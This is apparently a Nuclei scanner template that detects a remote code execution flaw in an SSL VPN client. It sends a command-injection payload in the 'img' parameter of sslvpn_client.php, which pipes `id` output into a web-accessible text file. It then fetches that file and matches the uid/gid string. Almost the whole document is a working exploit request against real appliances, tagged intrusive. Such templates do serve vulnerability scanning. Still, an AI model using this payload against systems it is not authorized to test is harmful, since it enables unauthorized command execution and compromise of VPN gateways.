id: sslvpn-client-rce

info:
  name: SSL VPN Client - Remote Code Execution
  author: DhiyaneshDK
  severity: critical
  reference:
    - https://github.com/server2565543706/Poc/blob/master/POC/anquantongsha.py
    - https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/security_products_rce.py
  metadata:
    max-request: 1
    verified: true
    fofo-query: body="/webui/images/default/default/alert_close.jpg"
  tags: sslvpn,rce,intrusive

variables:
  filename: "{{to_lower(rand_text_alpha(5))}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/{{filename}}.txt"
      - "{{BaseURL}}/sslvpn/{{filename}}.txt"

    matchers-condition: and
    matchers:
      - type: regex
        part: body_2
        regex:
          - 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'

      - type: word
        part: header_2
        words:
          - 'text/plain'
